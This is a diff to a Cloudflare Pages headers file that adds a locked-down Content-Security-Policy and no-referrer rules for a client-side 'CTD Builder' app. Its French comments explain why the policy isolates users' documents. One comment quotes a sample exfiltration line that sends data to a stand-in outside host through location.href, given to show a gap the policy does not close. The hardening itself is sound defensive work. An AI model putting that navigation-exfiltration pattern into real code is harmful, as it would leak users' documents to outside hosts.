@@ -24,6 +24,43 @@
   X-Frame-Options: SAMEORIGIN
   Cache-Control: public, max-age=300
 
+# ─────────────────────────────────────────────────────────────────────────────────────────────
+# CTD Builder — l'application de montage de dossiers CTD, servie SOUS UN CHEMIN de pharnos.com
+# (assemblée au déploiement depuis `web/dist-builder/`, cf. `web/scripts/assemble-builder.mjs`).
+#
+# `connect-src 'self'` EST L'ARGUMENT DE VENTE, ÉCRIT EN POLITIQUE APPLIQUÉE PAR LE NAVIGATEUR.
+# L'offre se vend sur « vos documents ne transitent jamais par les serveurs de Pharnos » : cette
+# directive interdit mécaniquement toute requête de fond vers une autre origine — `fetch`, XHR,
+# WebSocket, EventSource, `sendBeacon` — quel que soit le code livré.
+#
+# ⚠️ LE DÉTACHEMENT N'EST PAS FACULTATIF. Les règles Cloudflare Pages se CUMULENT : sans
+# `! Content-Security-Policy`, la CSP de `/*` ci-dessus — qui autorise `connect-src` vers Supabase
+# et `frame-src` vers le processeur de paiement — s'appliquerait AUSSI ici, et l'isolation ne
+# serait qu'un commentaire. Même mécanique que `/paiement/*`, pour une raison inverse : là on
+# élargit, ici on resserre.
+#
+# ⚠️ Ce que `connect-src` ne couvre PAS : la navigation de premier niveau
+# (`location.href = 'https://ailleurs/?d=' + données`). La directive `navigate-to` a été retirée
+# de la spécification et n'est implémentée nulle part. C'est pourquoi il existe un SECOND verrou,
+# dans le build : `web/src/builder/isolation.ts` refuse d'émettre du code contenant une adresse
+# absolue non autorisée ou une primitive de sortie. Aucun des deux ne suffit seul.
+#
+# ⚠️ Toute ouverture future (réservation de crédits, lot B3) s'écrit ICI, dans le même commit que
+# le code appelant — `npm run headers:builder` compare `connect-src` à `'self'` par ÉGALITÉ, pas
+# par sous-chaîne.
+# `! Referrer-Policy` aussi : sans détachement, les deux valeurs seraient envoyées (les règles se
+# cumulent) et le navigateur arbitrerait. Ici rien ne sort — donc rien à révéler, même pas l'origine.
+/ctd-builder/*
+  ! Content-Security-Policy
+  ! Referrer-Policy
+  Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self'; worker-src 'self'; manifest-src 'self'; object-src 'none'; base-uri 'self'; form-action 'none'; frame-ancestors 'none'
+  Referrer-Policy: no-referrer
+  Cross-Origin-Opener-Policy: same-origin
+
+# Assets empreintés du CTD Builder (hash dans le nom) → cache long immuable.
+/ctd-builder/assets/*
+  Cache-Control: public, max-age=31536000, immutable
+
 /assets/*
   Cache-Control: public, max-age=31536000, immutable
 
